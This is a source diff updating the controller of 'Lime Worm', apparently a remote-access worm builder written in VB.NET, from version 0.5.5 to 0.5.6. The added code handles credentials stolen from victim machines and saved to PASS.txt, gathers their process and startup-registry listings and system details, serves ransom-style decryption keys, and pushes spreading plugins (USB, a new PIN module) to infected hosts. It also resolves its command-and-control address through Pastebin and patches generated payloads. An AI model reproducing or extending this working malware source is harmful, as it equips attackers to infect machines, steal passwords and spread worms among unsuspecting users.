@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./01/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./04/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.5 ..                   ##
+'##                     .. Lime Worm v0.5.6 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -36,6 +36,7 @@
 
 
 
+Imports System.Net.Sockets
 Imports Mono.Cecil
 Imports Mono.Cecil.Cil
 
@@ -45,6 +46,8 @@ Public Class Form1
     Private m_SortingColumn As ColumnHeader
     Public Shared F As Form1
     Public Shared MYPORT As Integer
+    Public Shared MYIP As String = String.Empty
+
 
 
 
@@ -58,10 +61,6 @@ Public Class Form1
 
         ' Add any initialization after the InitializeComponent() call.
         Try
-
-            If Not IO.File.Exists(Application.StartupPath & "\GIO.dat") Then
-                IO.File.WriteAllBytes(Application.StartupPath & "\GIO.dat", My.Resources.GIO)
-            End If
 
             If Not IO.Directory.Exists(Application.StartupPath + "\" + "Wallpaper") Then
                 IO.Directory.CreateDirectory(Application.StartupPath + "\" + "Wallpaper")
@@ -103,7 +102,12 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.5.5"
+        BackgroundWorker1.RunWorkerAsync()
+    End Sub
+
+    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
+
+        Me.Text = "Lime Worm v0.5.6"
 
         If ToolStripStatusLabel2.Text.Contains("OFF") Then
             ToolStripStatusLabel2.ForeColor = Color.Red
@@ -114,10 +118,21 @@ Public Class Form1
         DROP.Checked = False
         PATH2.Enabled = False
 
-        Dim t1 As New Threading.Thread(AddressOf Checkip)
-        t1.Start()
+        Dim Client As TcpClient = Nothing
+        Try
+            Client = New TcpClient
+            Client.Connect(GetExternalAddress, MYPORT)
+            ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @ " & MYPORT & "]"
+            ToolStripStatusLabel3.ForeColor = Color.Lime
+        Catch ex As SocketException
+            ToolStripStatusLabel3.Text = "CLOSED [" & GetExternalAddress() & " @ " & MYPORT & "]"
+            ToolStripStatusLabel3.ForeColor = Color.Red
+        Finally
+            Client.Close()
+        End Try
 
     End Sub
+
 #End Region
 
 
@@ -159,7 +174,7 @@ Public Class Form1
 
                         If ToolStripStatusLabel2.Text = ("       NOTIFICATION [ON]") Then
                             NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
-                            NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP
+                            NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP.Split(":")(0)
                             NotifyIcon1.BalloonTipTitle = "Lime Worm | New Connection!"
                             NotifyIcon1.ShowBalloonTip(600)
                         End If
@@ -196,13 +211,13 @@ Public Class Form1
                         Exit Sub
                     End If
 
-                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)
+                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP.Split(":")(0))
 
                     If Cap Is Nothing Then
                         Cap = New Cap
                         Cap.F = Me
                         Cap.u = u
-                        Cap.Name = "!" + u.IP
+                        Cap.Name = "!" + u.IP.Split(":")(0)
                         Cap.Sz = New Size(A(1), A(2))
                         Cap.Show()
                     End If
@@ -212,10 +227,9 @@ Public Class Form1
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)
+                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP.Split(":")(0))
                     If Cap IsNot Nothing Then
                         If A(1).Length = 1 Then
-                            Cap.Text = u.IP + " Size: " & siz(b.Length) & " ,No Changes"
                             If Cap.Button1.Text = "Stop" Then
                                 S.Send(u, "@" & SPL & Cap.C1.SelectedIndex & SPL & Cap.C2 & SPL & Cap.C.Value)
                             End If
@@ -243,12 +257,12 @@ Public Class Form1
                         Exit Sub
                     End If
 
-                    Dim FM As Filemanager = My.Application.OpenForms("FM" + u.IP)
+                    Dim FM As Filemanager = My.Application.OpenForms("FM" + u.IP.Split(":")(0))
                     If FM Is Nothing Then
                         FM = New Filemanager
                         FM.F = Me
                         FM.U = u
-                        FM.Name = "FM" + u.IP
+                        FM.Name = "FM" + u.IP.Split(":")(0)
                         FM.Text = "FM " + u.IP.Split(":")(0)
                         FM.Show()
                     End If
@@ -259,73 +273,76 @@ Public Class Form1
                         Exit Sub
                     End If
 
-                    Dim FM As Filemanager = My.Application.OpenForms("FM" & u.IP)
-                    If A(1) = "Error " Then
-                        FM.BackToolStripMenuItem.PerformClick()
-                        FM.ToolStripStatusLabel1.Text = A(2)
-                    Else
-                        FM.ListView1.Items.Clear()
-                        Dim allFiles As String() = Split(A(1), "|SPL_FM|")
-                        For i = 0 To allFiles.Length - 2
-                            Dim itm As New ListViewItem
-                            itm.Text = allFiles(i)
-                            itm.SubItems.Add(allFiles(i + 1))
-                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
-                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
-                                If fsize > 1073741824 Then
-                                    Dim size As Double = fsize / 1073741824
-                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
-                                ElseIf fsize > 1048576 Then
-                                    Dim size As Double = fsize / 1048576
-                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
-                                ElseIf fsize > 1024 Then
-                                    Dim size As Double = fsize / 1024
-                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
-                                Else
-                                    itm.SubItems(1).Text = fsize.ToString & " B"
-                                End If
-                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
-                            End If
-                            If itm.Text.StartsWith("[Drive]") Then
-                                itm.ImageIndex = 0
-                                itm.Text = itm.Text.Substring(7)
-                            ElseIf itm.Text.StartsWith("[CD]") Then
-                                itm.ImageIndex = 1
-                                itm.Text = itm.Text.Substring(4)
-                            ElseIf itm.Text.StartsWith("[Folder]") Then
-                                itm.ImageIndex = 2
-                                itm.Text = itm.Text.Substring(8)
-                            ElseIf itm.Text.EndsWith(".exe") Then
-                                itm.ImageIndex = 3
-                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
-                                itm.ImageIndex = 4
-                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
-                                itm.ImageIndex = 5
-                            ElseIf itm.Text.EndsWith(".dll") Then
-                                itm.ImageIndex = 6
-                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
-                                itm.ImageIndex = 7
-                            ElseIf itm.Text.EndsWith(".wav") Then
-                                itm.ImageIndex = 9
-                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".mb4") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
-                                itm.ImageIndex = 11
-                            ElseIf itm.Text.EndsWith(".mp3") Then
-                                itm.ImageIndex = 12
-                            ElseIf itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".Php") Or itm.Text.EndsWith(".xml") Then
-                                itm.ImageIndex = 10
-                            ElseIf itm.Text.EndsWith(".rar") Then
-                                itm.ImageIndex = 13
-                            ElseIf itm.Text.EndsWith(".Lime") Then
-                                itm.ForeColor = Color.Lime
-                                itm.ImageIndex = 14
-                            Else
-                                itm.ImageIndex = 8
-                            End If
-                            FM.ListView1.Items.Add(itm)
-                            i += 1
-                        Next
-                    End If
+                    Dim FM As Filemanager = My.Application.OpenForms("FM" & u.IP.Split(":")(0))
+                    If FM IsNot Nothing Then
 
+
+                        If A(1) = "Error " Then
+                            FM.BackToolStripMenuItem.PerformClick()
+                            FM.ToolStripStatusLabel1.Text = A(2)
+                        Else
+                            FM.ListView1.Items.Clear()
+                            Dim allFiles As String() = Split(A(1), "|SPL_FM|")
+                            For i = 0 To allFiles.Length - 2
+                                Dim itm As New ListViewItem
+                                itm.Text = allFiles(i)
+                                itm.SubItems.Add(allFiles(i + 1))
+                                If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
+                                    Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
+                                    If fsize > 1073741824 Then
+                                        Dim size As Double = fsize / 1073741824
+                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
+                                    ElseIf fsize > 1048576 Then
+                                        Dim size As Double = fsize / 1048576
+                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
+                                    ElseIf fsize > 1024 Then
+                                        Dim size As Double = fsize / 1024
+                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
+                                    Else
+                                        itm.SubItems(1).Text = fsize.ToString & " B"
+                                    End If
+                                    itm.Tag = Convert.ToInt64(allFiles(i + 1))
+                                End If
+                                If itm.Text.StartsWith("[Drive]") Then
+                                    itm.ImageIndex = 0
+                                    itm.Text = itm.Text.Substring(7)
+                                ElseIf itm.Text.StartsWith("[CD]") Then
+                                    itm.ImageIndex = 1
+                                    itm.Text = itm.Text.Substring(4)
+                                ElseIf itm.Text.StartsWith("[Folder]") Then
+                                    itm.ImageIndex = 2
+                                    itm.Text = itm.Text.Substring(8)
+                                ElseIf itm.Text.EndsWith(".exe") Then
+                                    itm.ImageIndex = 3
+                                ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
+                                    itm.ImageIndex = 4
+                                ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
+                                    itm.ImageIndex = 5
+                                ElseIf itm.Text.EndsWith(".dll") Then
+                                    itm.ImageIndex = 6
+                                ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
+                                    itm.ImageIndex = 7
+                                ElseIf itm.Text.EndsWith(".wav") Then
+                                    itm.ImageIndex = 9
+                                ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".mb4") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
+                                    itm.ImageIndex = 11
+                                ElseIf itm.Text.EndsWith(".mp3") Then
+                                    itm.ImageIndex = 12
+                                ElseIf itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".Php") Or itm.Text.EndsWith(".xml") Then
+                                    itm.ImageIndex = 10
+                                ElseIf itm.Text.EndsWith(".rar") Then
+                                    itm.ImageIndex = 13
+                                ElseIf itm.Text.EndsWith(".Lime") Then
+                                    itm.ForeColor = Color.Lime
+                                    itm.ImageIndex = 14
+                                Else
+                                    itm.ImageIndex = 8
+                                End If
+                                FM.ListView1.Items.Add(itm)
+                                i += 1
+                            Next
+                        End If
+                    End If
                 Case "PWD+"
 
                     If Me.InvokeRequired Then
@@ -344,47 +361,47 @@ Public Class Form1
                     End If
 
                     'duplicate 
-                    For Each listItem As ListViewItem In P.ListView1.Items
-                        If listItem.SubItems.Item(0).Text.Contains(A(2).ToString) Then
-                            Exit Select
-                        End If
-                    Next
+                    Try
+                        For Each listItem As ListViewItem In P.ListView1.Items
+                            If listItem.SubItems.Item(0).Text.TrimStart.TrimEnd = A(2) Then
+                                Exit Select
+                            End If
+                        Next
+                    Catch ex As Exception
+                    End Try
 
-                    Dim aa As String() = Split(A(1), "~|~")
-                    For i = 2 To aa.Length
-                        Dim ii As New ListViewItem
-                        ii.Text = aa(i)
-                        ii.SubItems.Add(aa(i + 2))
-                        ii.SubItems.Add(aa(i + 4))
-                        ii.SubItems.Add(aa(i + 6))
-                        ii.SubItems.Add(aa(i + 8))
-                        P.ListView1.Items.Add(ii)
-                        i += 9
-                    Next
+                    Try
+                        Dim aa As String() = Split(A(1), "~|~")
+                        For i = 2 To aa.Length
+                            Dim ii As New ListViewItem
+                            ii.Text = aa(i)
+                            ii.SubItems.Add(aa(i + 2))
+                            ii.SubItems.Add(aa(i + 4))
+                            ii.SubItems.Add(aa(i + 6))
+                            ii.SubItems.Add(aa(i + 8))
+                            P.ListView1.Items.Add(ii)
+                            i += 9
+                        Next
+                    Catch ex As Exception
+                    End Try
 
                     IO.File.WriteAllText(uFolder(A(2), "PASS.txt"), A(1))
-                Case "Details"
+
+                Case "SysInfo"
                     If Me.InvokeRequired Then
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
 
-                    Dim n As Info = My.Application.OpenForms("Details" + u.IP)
+                    Dim n As Info = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
                     If n Is Nothing Then
                         n = New Info
                         n.F = Me
                         n.U = u
-                        n.Name = "Details" + u.IP
-                        n.Text = "Details " + u.IP.Split(":")(0)
+                        n.Name = "Info" + u.IP.Split(":")(0)
+                        n.Text = "System Info " + u.IP.Split(":")(0)
                         n.Show()
                     End If
-                    n.ListView1.Clear()
-                    n.ListView1.FullRowSelect = True
-                    n.ListView1.View = View.Details
-                    n.ListView1.Columns.Add("")
-                    n.ListView1.Columns.Add("")
-                    n.ListView1.HeaderStyle = ColumnHeaderStyle.None
-
 
                     Dim GW As New ListViewGroup("Windows", HorizontalAlignment.Left)
                     Dim GU As New ListViewGroup("User", HorizontalAlignment.Left)
@@ -392,45 +409,233 @@ Public Class Form1
                     Dim GL As New ListViewGroup("Worm", HorizontalAlignment.Left)
                     Dim GM As New ListViewGroup("MISC", HorizontalAlignment.Left)
 
+                    Try
+                        With n.ListView1
+                            .Clear()
+                            .FullRowSelect = True
+                            .View = View.Details
+                            .Columns.Add("")
+                            .Columns.Add("")
+                            .HeaderStyle = ColumnHeaderStyle.None
 
-                    n.ListView1.Groups.Add(GU)
-                    n.ListView1.Groups.Add(GW)
-                    n.ListView1.Groups.Add(GS)
-                    n.ListView1.Groups.Add(GL)
-                    n.ListView1.Groups.Add(GM)
+                            .Groups.Add(GU)
+                            .Groups.Add(GW)
+                            .Groups.Add(GS)
+                            .Groups.Add(GL)
+                            .Groups.Add(GM)
+                        End With
+                    Catch ex As Exception
+                    End Try
 
+                    With n.ListView1.Items
+                        .Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))
 
-                    n.ListView1.Items.Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))
-                    n.ListView1.Items.Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
-                    n.ListView1.Items.Add(New ListViewItem("Worm ID: ", GU)).SubItems.Add(A(20))
-
-
-                    n.ListView1.Items.Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
-                    n.ListView1.Items.Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(5))
-                    n.ListView1.Items.Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(6))
-                    n.ListView1.Items.Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))
-
-
-                    n.ListView1.Items.Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
-                    n.ListView1.Items.Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
-                    n.ListView1.Items.Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
-                    n.ListView1.Items.Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
-                    n.ListView1.Items.Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
-                    n.ListView1.Items.Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
-                    n.ListView1.Items.Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
+                        .Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
+                        .Add(New ListViewItem("Worm ID: ", GU)).SubItems.Add(A(20))
 
 
-                    n.ListView1.Items.Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
-                    n.ListView1.Items.Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
-                    n.ListView1.Items.Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
-                    n.ListView1.Items.Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))
+                        .Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
+                        .Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(5))
+                        .Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(6))
+                        .Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))
 
 
-                    n.ListView1.Items.Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
-                    n.ListView1.Items.Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
+                        .Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
+                        .Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
+                        .Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
+                        .Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
+                        .Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
+                        .Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
+                        .Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
+                        .Add(New ListViewItem("Removable Drivers: ", GS)).SubItems.Add(A(23))
+
+
+                        .Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
+                        .Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
+                        .Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
+                        .Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))
+
+                        .Add(New ListViewItem("Active Window: ", GM)).SubItems.Add("{ " & A(21) & " }")
+                        .Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
+                        .Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
+                        .Add(New ListViewItem("Firewall: ", GM)).SubItems.Add(A(22))
+                    End With
+
                     n.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
 
 
+                Case "PROC"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+                    Dim n As Info = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
+                    If n IsNot Nothing Then
+
+                        Try
+                            With n.L2
+                                .Clear()
+                                .View = View.Details
+                                .Columns.Add("Process name", 250)
+                                .Columns.Add("Process ID", 80)
+                                .Columns.Add("Process path", 250)
+                                .GridLines = True
+                            End With
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim PR As String() = Split(A(1), "|'P'|")
+                            For i As Integer = 0 To PR.Length
+                                With n.L2.Items.Add(PR(i))
+                                    .SubItems.Add(PR(i + 1))
+                                    .SubItems.Add(PR(i + 2))
+                                    i += 2
+                                End With
+                            Next
+                        Catch ex1 As Exception
+                        End Try
+
+                        Try
+                            For Each x As ListViewItem In n.L2.Items
+                                If x.SubItems(2).Text = A(2) Then
+                                    x.ForeColor = Color.Lime
+                                End If
+                            Next
+                        Catch ex2 As Exception
+                        End Try
+                    End If
+
+                    n.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+
+                Case "STUP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+                    Dim n As Info = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
+                    If n IsNot Nothing Then
+                        Dim G1 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
+                        Dim G2 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\", HorizontalAlignment.Left)
+                        Dim G3 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\", HorizontalAlignment.Left)
+                        Dim G4 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
+                        Dim G8 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
+                        Dim G6 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)
+                        Dim G5 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", HorizontalAlignment.Left)
+                        Dim G7 As New ListViewGroup("Startup Folder", HorizontalAlignment.Left)
+
+                        Try
+                            With n.L3
+                                .Clear()
+                                .View = View.Details
+                                .HeaderStyle = ColumnHeaderStyle.None
+                                .Columns.Add("")
+                                .Columns.Add("")
+                                .GridLines = True
+                                .Groups.Add(G1)
+                                .Groups.Add(G2)
+                                .Groups.Add(G3)
+                                .Groups.Add(G4)
+                                .Groups.Add(G8)
+                                .Groups.Add(G6)
+                                .Groups.Add(G5)
+                                .Groups.Add(G7)
+                                .ShowGroups = True
+                                .FullRowSelect = True
+                            End With
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(1), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With n.L3.Items
+                                    .Add(New ListViewItem(ST(i), G1)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(2), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With n.L3.Items
+                                    .Add(New ListViewItem(ST(i), G2)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(3), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With n.L3.Items
+                                    .Add(New ListViewItem(ST(i), G3)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(4), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With n.L3.Items
+                                    .Add(New ListViewItem(ST(i), G4)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(8), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With n.L3.Items
+                                    .Add(New ListViewItem(ST(i), G8)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(6), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With n.L3.Items
+                                    .Add(New ListViewItem(ST(i), G6)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(5), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With n.L3.Items
+                                    .Add(New ListViewItem(ST(i), G5)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(7), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With n.L3.Items
+                                    .Add(New ListViewItem(ST(i), G7)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        n.L3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    End If
                 Case "DEC"
                     S.Send(u, "DEC" + SPL + IO.File.ReadAllText(uFolder(A(1), "KEY.txt")))
 
@@ -451,6 +656,8 @@ Public Class Form1
                 Case "PLUSB"
                     S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\USB.dll")) + SPL + "_USB")
 
+                Case "PLPIN"
+                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\PIN.dll")) + SPL + "_PIN")
 
             End Select
         Catch ex As Exception
@@ -564,10 +771,6 @@ Public Class Form1
         End Function
     End Class
 
-    Sub Checkip()
-        ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @ " & MYPORT & "]"
-        Exit Sub
-    End Sub
     Private Sub Fix()
         On Error Resume Next
         Me.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
@@ -697,8 +900,8 @@ Public Class Form1
         ' Sort.
         L1.Sort()
         Fix()
-    End Sub
 
+    End Sub
 
     Public Class MyRenderer
         Inherits ToolStripProfessionalRenderer
@@ -965,6 +1168,9 @@ Public Class Form1
                                                 If (str = "%USB%") Then
                                                     current.Operand = USB_CHK.Checked.ToString
                                                 End If
+                                                If (str = "%PIN%") Then
+                                                    current.Operand = PIN_CHK.Checked.ToString
+                                                End If
                                                 If (str = "%ANTI%") Then
                                                     current.Operand = ANTI.Checked.ToString
                                                 End If
@@ -993,7 +1199,6 @@ Public Class Form1
     End Sub
 
     Private Sub DROP_CheckedChanged(sender As Object) Handles DROP.CheckedChanged
-
         If DROP.Checked = True Then
             EXE.Enabled = True
             PATH1.Enabled = True
@@ -1006,25 +1211,27 @@ Public Class Form1
     End Sub
 
     Private Sub ChButton2_Click(sender As Object, e As EventArgs) Handles ChButton2.Click
+        BackgroundWorker2.RunWorkerAsync()
+    End Sub
+
+    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
         Try
-            Dim t1 As Threading.Thread = New Threading.Thread(AddressOf Check_PB)
-            t1.Start(Pastebin.Text)
+            Dim x As String
+            Dim wc As New Net.WebClient
+            Dim rx As New Text.RegularExpressions.Regex("^(?:(?:25[0-5]|2[0-4]\d|[01]\d\d|\d?\d)(?(?=\.?\d)\.)){4}$")
+            x = wc.DownloadString(Pastebin.Text)
+
+            If rx.IsMatch(x.Split(":")(0)) AndAlso x.Split(":")(1) <= 65535 Then
+                MsgBox("Valid! " + x, MsgBoxStyle.Information)
+            Else
+                MsgBox("Wrong format", MsgBoxStyle.Critical)
+            End If
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
         End Try
     End Sub
 
-
-    Public Shared Sub Check_PB(ByVal txt As String)
-        Try
-            Dim WC As New Net.WebClient
-            MsgBox(WC.DownloadString(txt))
-        Catch ex As Exception
-            MsgBox(ex.Message, MsgBoxStyle.Critical)
-        End Try
-    End Sub
-
-    Private Sub Icon_Box_Click(sender As Object, e As EventArgs) Handles Icon_Box.Click
+    Private Sub Icon_OFF_CheckedChanged(sender As Object) Handles Icon_OFF.CheckedChanged
         If Icon_OFF.Checked = True Then
             Dim o As New OpenFileDialog
             With o
@@ -1038,9 +1245,9 @@ Public Class Form1
             Else
                 Icon_OFF.Checked = False
             End If
-
         End If
     End Sub
+
 
 #End Region
 
